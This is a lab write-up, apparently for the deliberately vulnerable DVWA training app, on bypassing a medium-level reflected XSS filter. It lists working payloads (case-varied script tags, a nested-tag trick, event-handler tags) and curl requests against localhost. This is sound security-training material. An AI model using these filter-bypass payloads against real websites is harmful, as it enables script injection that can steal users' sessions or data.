# DVWA XSS (Reflected) — Medium Security

## URL
http://127.0.0.1:4280/vulnerabilities/xss_r/

## Vulnerable Parameter
name (GET parameter)

## Source Code Behavior (Medium)
- Replaces `<script>` tag using `str_replace('<script>', '', $_GET['name'])`
- Only removes lowercase `<script>` — case-sensitive replacement
- Only removes the exact string once

## Key Differences from Low
1. `<script>` tag is stripped (but only lowercase, one pass)
2. Other HTML tags are NOT filtered
3. Case-sensitive — `<Script>` bypasses the filter

## Detection
1. Enter `<script>alert(1)</script>` — script tags stripped, shows "alert(1)" as text
2. Enter `<Script>alert(1)</Script>` — XSS executes (case bypass)

## Working Payloads

### Case variation bypass
```
<Script>alert(1)</Script>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
```

### Nested tag bypass (double script)
```
<scr<script>ipt>alert(1)</script>
```
After `<script>` is removed from the middle, the remaining text forms `<script>alert(1)</script>`

### Event handler bypass (no script tag needed)
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

## Step-by-Step Exploitation
1. Enter `<script>alert(1)</script>` — fails, tags stripped
2. Enter `<SCRIPT>alert(1)</SCRIPT>` — XSS executes (case bypass)
3. Alternatively: `<img src=x onerror=alert(1)>` — works (img tag not filtered)

## curl Commands
```bash
# Test case bypass
curl -v "http://127.0.0.1:4280/vulnerabilities/xss_r/?name=%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E" \
  -b "PHPSESSID=<session>;security=medium"

# Test img tag bypass
curl -v "http://127.0.0.1:4280/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" \
  -b "PHPSESSID=<session>;security=medium"
```

## Notes
- `str_replace` is case-sensitive and single-pass — trivially bypassed
- Event handlers on non-script tags are not filtered at all
- Multiple bypass methods available
